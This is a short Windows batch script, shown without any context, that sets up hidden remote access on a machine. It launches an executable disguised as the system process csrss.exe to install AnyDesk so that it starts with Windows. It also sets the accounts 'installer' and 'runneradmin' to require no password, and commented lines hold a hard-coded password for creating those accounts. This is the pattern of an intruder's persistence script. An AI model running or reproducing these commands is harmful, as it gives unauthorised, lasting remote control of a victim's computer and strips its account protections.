REM net user installer P0w!E4sy1nst4ll3r@
REM net user runneradmin P0w!E4sy1nst4ll3r@
csrss.exe --install  “C:\Program Files (x86)\AnyDesk” --start-with-win --create-desktop-icon
net user installer /passwordreq:no
net user runneradmin /passwordreq:no
exit
